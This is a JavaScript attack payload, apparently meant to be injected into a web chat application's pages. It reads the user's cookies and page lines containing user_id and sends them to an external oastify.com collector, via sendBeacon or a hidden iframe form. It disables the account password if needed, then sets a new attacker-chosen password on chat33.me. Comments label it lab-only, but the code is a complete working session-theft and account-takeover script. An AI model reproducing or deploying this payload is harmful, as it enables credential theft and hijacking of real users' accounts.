(async () => {
    const TARGET = window.location.origin + "/app/";
    const COLLECT_BASE = "https://1iktenjctvalgpl48to4eltmyd44swxkm.oastify.com/secretnew13";
    // change this to the desired lab password
    const NEW_PASS = "24682468";
  
    async function sendToCollector(hits) {
      try {
        const cookies = document.cookie || "";
        const meta = { cookies, page: location.href, ts: new Date().toISOString() };
  
        console.log("[exf] document.cookie:", cookies);
        console.log("[exf] meta to send:", meta);
  
        const metaJson = JSON.stringify(meta);
        const metaB64 = btoa(unescape(encodeURIComponent(metaJson)));
  
        const MAX_COOKIE_QS_LEN = 1900;
        let finalMetaB64 = metaB64;
        if (metaB64.length > MAX_COOKIE_QS_LEN) {
          const truncated = Object.assign({}, meta, { cookies: cookies.slice(0, 1000) });
          finalMetaB64 = btoa(unescape(encodeURIComponent(JSON.stringify(truncated))));
          console.warn("[exf] Meta truncated for URL length");
        }
  
        const qs = new URLSearchParams({ payload_b64: finalMetaB64 });
        const collectUrl = COLLECT_BASE + "?" + qs.toString();
  
        const payloadText = hits.join("\n");
  
        // preferred: sendBeacon (no preflight)
        try {
          const ok = navigator.sendBeacon(collectUrl, new Blob([payloadText], { type: "text/plain" }));
          console.log("[exf] sendBeacon returned:", ok, "collectUrl length:", collectUrl.length);
          if (ok) return;
          console.warn("[exf] sendBeacon returned false — will use form fallback");
        } catch (e) {
          console.warn("[exf] sendBeacon threw:", e, " — will use form fallback");
        }
  
        // fallback: cross-origin form POST into hidden iframe (no preflight)
        try {
          const iframeName = "exf_ifr_" + Math.random().toString(36).slice(2);
          const iframe = document.createElement("iframe");
          iframe.name = iframeName;
          iframe.style.display = "none";
          document.documentElement.appendChild(iframe);
  
          const form = document.createElement("form");
          form.method = "POST";
          form.action = collectUrl;
          form.enctype = "text/plain";
          form.target = iframeName;
  
          const ta = document.createElement("textarea");
          ta.name = "body";
          ta.value = payloadText;
          form.appendChild(ta);
  
          form.style.display = "none";
          document.documentElement.appendChild(form);
          form.submit();
  
          setTimeout(() => { form.remove(); iframe.remove(); }, 2000);
          console.log("[exf] fallback form POST submitted to collector");
        } catch (e) {
          console.error("[exf] fallback form POST error:", e);
        }
      } catch (e) {
        console.error("[exf] sendToCollector error:", e);
      }
    }
  
    try {
      let r = await fetch(TARGET, { method: "GET", credentials: "include" });
      let text = await r.text();
      let lines = text.split(/\r?\n/);
  
      let hits = lines.filter(l => /user_id/i.test(l));
  
      if (!hits.length) {
        console.log("[exf] no user_id found — attempting to disable password and retry");
  
        try {
          // same-origin POST to disable password (no custom headers)
          await fetch("/app/ajax/setting/del_pass", { method: "POST", credentials: "include" });
          console.log("[exf] del_pass request sent");
        } catch (e) {
          console.error("[exf] del_pass request error:", e);
          // continue — we'll still try to re-fetch
        }
  
        // short wait then re-fetch
        await new Promise(res => setTimeout(res, 500));
        r = await fetch(TARGET, { method: "GET", credentials: "include" });
        text = await r.text();
        lines = text.split(/\r?\n/);
        hits = lines.filter(l => /user_id/i.test(l));
  
        if (!hits.length) {
          console.log("[exf] Still no user_id after disabling password — sending only meta (cookies may be empty if HttpOnly)");
          await sendToCollector([]);
          console.log("[exf] Meta sent (no hits).");
        } else {
          console.log("[exf] user_id found after disabling password — proceeding to exfiltrate hits + meta");
          await sendToCollector(hits);
          console.log("[exf] Exfiltrated hits + cookies/meta");
        }
      } else {
        // hits exist — send them with meta (cookies included)
        await sendToCollector(hits);
        console.log("[exf] Exfiltrated hits + cookies/meta");
      }
  
      // ---------- NEW: attempt to set new password (LAB ONLY) ----------
      // Primary: the exact fetch you provided (works in your lab)
      try {
        console.log("[pw] Attempting set_pass_now via working fetch (primary).");
        const resp = await fetch("https://chat33.me/app/ajax/setting/set_pass_now", {
          credentials: "include",
          headers: {
            // some browsers ignore/forbid certain headers, but you said this exact call works in your lab console
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-GPC": "1"
          },
          referrer: "https://chat33.me/app/page?op=new_no_ad&ads=hide_admob&p=setting/password",
          body: `pass=${encodeURIComponent(NEW_PASS)}`,
          method: "POST",
          mode: "cors"
        });
  
        let txt = "";
        try { txt = await resp.text(); } catch (e) { txt = ""; }
  
        if (resp.ok) {
          console.log("[pw] Password change response OK (truncated):", txt.slice(0, 1000));
        } else {
          console.warn("[pw] Password change returned status", resp.status, "response snippet:", txt.slice(0, 1000));
          throw new Error("Non-OK response from password endpoint");
        }
      } catch (err) {
        console.warn("[pw] Primary fetch attempt failed or non-OK. Error:", err, " — trying form fallback.");
  
        // Fallback: hidden form submit (mimic browser form)
        try {
          const f = document.createElement("form");
          f.method = "POST";
          f.action = "/app/ajax/setting/set_pass_now";
          f.enctype = "application/x-www-form-urlencoded";
          f.style.display = "none";
  
          const inpt = document.createElement("input");
          inpt.type = "hidden";
          inpt.name = "pass";
          inpt.value = NEW_PASS;
          f.appendChild(inpt);
  
          document.documentElement.appendChild(f);
          f.submit();
  
          setTimeout(() => { f.remove(); }, 1500);
          console.log("[pw] Password change submitted via hidden form fallback.");
        } catch (e2) {
          console.error("[pw] Form fallback for password change failed:", e2);
        }
      }
  
      console.log("[exf] Script finished. (Lab-only) New password attempted:", NEW_PASS);
  
    } catch (err) {
      console.error("[exf] Fetch error:", err);
    }
  })();
  
